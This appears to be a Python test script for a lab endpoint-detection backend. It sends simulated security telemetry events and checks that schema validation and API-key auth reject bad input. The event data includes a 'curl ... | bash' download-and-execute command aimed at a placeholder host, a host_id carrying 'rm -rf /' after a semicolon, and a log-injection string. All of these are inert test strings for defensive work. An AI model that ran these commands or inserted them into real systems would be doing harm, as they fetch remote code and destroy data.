"""
AIDR-Lite Phase 1 — Event Simulator
====================================
Sends a representative batch of telemetry events to the backend ingest endpoint
without needing an Ubuntu VM or a real agent running.

Covers every event_type and action the detection engine will eventually handle,
plus a set of intentional rejection cases so you can verify the schema
validation and auth middleware are working correctly.

Usage:
    # From the repo root:
    python scripts/simulate_events.py

    # Override defaults:
    AGENT_INGEST_URL=http://localhost:8000/api/events \
    AGENT_API_KEY=your_key_here \
    AGENT_HOST_ID=test-laptop \
    python scripts/simulate_events.py
"""

from __future__ import annotations

import os
import sys
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from dotenv import load_dotenv
import requests

# Load .env from repo root so you can just run this script directly
# without setting any env vars manually first.
# __file__ = scripts/simulate_events.py  →  .parent = scripts/  →  .parent² = repo root
load_dotenv(Path(__file__).parents[1] / ".env")

# ---------------------------------------------------------------------------
# Config — reads from env, falls back to sane lab defaults
# ---------------------------------------------------------------------------
INGEST_URL: str = os.environ.get("AGENT_INGEST_URL", "http://localhost:8000/api/events")
API_KEY: str = os.environ.get("AGENT_API_KEY", "")
HOST_ID: str = os.environ.get("AGENT_HOST_ID", "sim-laptop-01")


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def base(event_type: str, action: str, raw: dict[str, Any]) -> dict:
    """Build a minimal valid event envelope."""
    return {
        "ts": now_iso(),
        "host_id": HOST_ID,
        "event_type": event_type,
        "action": action,
        "raw": raw,
    }


# ---------------------------------------------------------------------------
# Test cases
# ---------------------------------------------------------------------------

VALID_EVENTS: list[tuple[str, dict]] = [
    # --- Auth ---------------------------------------------------------------
    (
        "auth / login_fail — SSH brute force attempt",
        base("auth", "login_fail", {
            "line": "May 13 10:01:01 ubuntu sshd[1234]: Failed password for root from 203.0.113.5 port 52100 ssh2",
            "source_ip": "203.0.113.5",
            "target_user": "root",
        }),
    ),
    (
        "auth / ssh_login_success — normal login",
        base("auth", "ssh_login_success", {
            "line": "May 13 10:02:00 ubuntu sshd[1235]: Accepted publickey for steven from 192.168.1.10 port 43210 ssh2",
            "source_ip": "192.168.1.10",
            "target_user": "steven",
        }),
    ),
    (
        "auth / sudo_fail — bad sudo attempt",
        base("auth", "sudo_fail", {
            "line": "May 13 10:03:00 ubuntu sudo: pam_unix(sudo:auth): authentication failure; logname=steven uid=1001",
            "target_user": "steven",
        }),
    ),
    (
        "auth / sudo_success — privilege escalation succeeded",
        base("auth", "sudo_success", {
            "line": "May 13 10:04:00 ubuntu sudo: steven : TTY=pts/0 ; PWD=/home/steven ; USER=root ; COMMAND=/bin/bash",
            "target_user": "steven",
            "command": "/bin/bash",
        }),
    ),
    # --- Process ------------------------------------------------------------
    (
        "process / exec — suspicious download-then-execute",
        base("process", "exec", {
            "pid": 5001,
            "ppid": 4999,
            "user": "www-data",
            "cmdline": "curl http://203.0.113.99/payload.sh | bash",
            "exe": "/usr/bin/curl",
        }),
    ),
    (
        "process / privileged_exec — sudo bash directly",
        base("process", "privileged_exec", {
            "pid": 5010,
            "ppid": 5009,
            "user": "steven",
            "cmdline": "sudo /bin/bash",
            "exe": "/usr/bin/sudo",
        }),
    ),
    # --- Network ------------------------------------------------------------
    (
        "network / outbound_connection — connection to rare port",
        base("network", "outbound_connection", {
            "pid": 6001,
            "exe": "/usr/bin/python3",
            "user": "www-data",
            "local_addr": "10.0.0.5:54321",
            "remote_addr": "198.51.100.22:4444",
            "proto": "tcp",
        }),
    ),
    (
        "network / new_listener — unexpected service exposed",
        base("network", "new_listener", {
            "pid": 6100,
            "exe": "/tmp/backdoor",
            "user": "root",
            "bind_addr": "0.0.0.0:31337",
            "proto": "tcp",
        }),
    ),
    (
        "network / high_connection_count — possible C2 beacon",
        base("network", "high_connection_count", {
            "pid": 6200,
            "exe": "/usr/bin/python3",
            "user": "steven",
            "connection_count": 85,
            "window_seconds": 30,
        }),
    ),
    # --- Filesystem ---------------------------------------------------------
    (
        "filesystem / sensitive_file_write — /etc/passwd modified",
        base("filesystem", "sensitive_file_write", {
            "path": "/etc/passwd",
            "pid": 7001,
            "exe": "/usr/sbin/useradd",
            "user": "root",
        }),
    ),
    (
        "filesystem / sensitive_file_write — /etc/sudoers modified",
        base("filesystem", "sensitive_file_write", {
            "path": "/etc/sudoers",
            "pid": 7002,
            "exe": "/bin/vi",
            "user": "root",
        }),
    ),
    (
        "filesystem / sensitive_file_read — /etc/shadow accessed",
        base("filesystem", "sensitive_file_read", {
            "path": "/etc/shadow",
            "pid": 7003,
            "exe": "/usr/bin/cat",
            "user": "steven",
        }),
    ),
    # --- Persistence --------------------------------------------------------
    (
        "persistence / startup_modified — .bashrc changed",
        base("persistence", "startup_modified", {
            "path": "/home/steven/.bashrc",
            "pid": 8001,
            "exe": "/bin/bash",
            "user": "steven",
            "change_type": "modified",
        }),
    ),
    (
        "persistence / startup_modified — /etc/profile changed",
        base("persistence", "startup_modified", {
            "path": "/etc/profile",
            "pid": 8002,
            "exe": "/bin/vi",
            "user": "root",
            "change_type": "modified",
        }),
    ),
]

# Events that MUST be rejected by the backend (schema violations or bad auth)
REJECTION_CASES: list[tuple[str, dict, dict | None]] = [
    (
        "missing event_type field",
        {"ts": now_iso(), "host_id": HOST_ID, "action": "login_fail", "raw": {}},
        None,  # use valid API key
    ),
    (
        "invalid event_type value",
        base("definitely_not_real", "login_fail", {}),
        None,
    ),
    (
        "host_id with shell metacharacters",
        {**base("auth", "login_fail", {}), "host_id": "host; rm -rf /"},
        None,
    ),
    (
        "action with spaces (log injection attempt)",
        {**base("auth", "login_fail", {}), "action": "login fail\n[FAKE LOG ENTRY]"},
        None,
    ),
    (
        "wrong API key",
        base("auth", "login_fail", {}),
        {"X-API-Key": "totallyWrongKey"},  # override headers
    ),
    (
        "missing API key header",
        base("auth", "login_fail", {}),
        {},  # no API key at all
    ),
]


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

def send(label: str, payload: dict, headers: dict | None = None) -> requests.Response:
    h = {"X-API-Key": API_KEY}
    if headers is not None:
        h = headers  # full override (allows testing missing-key case)
    return requests.post(INGEST_URL, json=payload, headers=h, timeout=5)


def run() -> None:
    if not API_KEY:
        print("ERROR: AGENT_API_KEY is not set. Export it before running.\n"
              "  export AGENT_API_KEY=your_backend_api_key_here")
        sys.exit(1)

    print(f"\n{'='*60}")
    print(f"  AIDR-Lite Event Simulator")
    print(f"  Target : {INGEST_URL}")
    print(f"  Host ID: {HOST_ID}")
    print(f"{'='*60}\n")

    # --- Valid events -------------------------------------------------------
    print("── VALID EVENTS (expect 202 Accepted) ──────────────────────\n")
    passed = 0
    failed = 0
    for label, payload in VALID_EVENTS:
        try:
            resp = send(label, payload)
            status = "✓ PASS" if resp.status_code == 202 else f"✗ FAIL ({resp.status_code})"
            if resp.status_code == 202:
                passed += 1
            else:
                failed += 1
                print(f"  {status}  {label}")
                print(f"         response: {resp.text[:200]}")
                continue
        except requests.RequestException as exc:
            print(f"  ✗ ERR   {label}\n         {exc}")
            failed += 1
            continue
        print(f"  {status}  {label}")

    # --- Rejection cases ----------------------------------------------------
    print(f"\n── REJECTION CASES (expect 4xx) ─────────────────────────────\n")
    rej_passed = 0
    rej_failed = 0
    for label, payload, header_override in REJECTION_CASES:
        try:
            resp = send(label, payload, headers=header_override)
            if resp.status_code in (400, 401, 422):
                print(f"  ✓ REJECTED ({resp.status_code})  {label}")
                rej_passed += 1
            else:
                print(f"  ✗ SHOULD HAVE BEEN REJECTED (got {resp.status_code})  {label}")
                rej_failed += 1
        except requests.RequestException as exc:
            print(f"  ✗ ERR   {label}\n         {exc}")
            rej_failed += 1

    # --- Summary ------------------------------------------------------------
    print(f"\n{'='*60}")
    print(f"  Valid events   : {passed}/{len(VALID_EVENTS)} accepted")
    print(f"  Rejection cases: {rej_passed}/{len(REJECTION_CASES)} correctly rejected")
    if failed or rej_failed:
        print(f"\n  ⚠  {failed + rej_failed} unexpected result(s) — check backend logs")
    else:
        print(f"\n  All checks passed ✓")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    run()
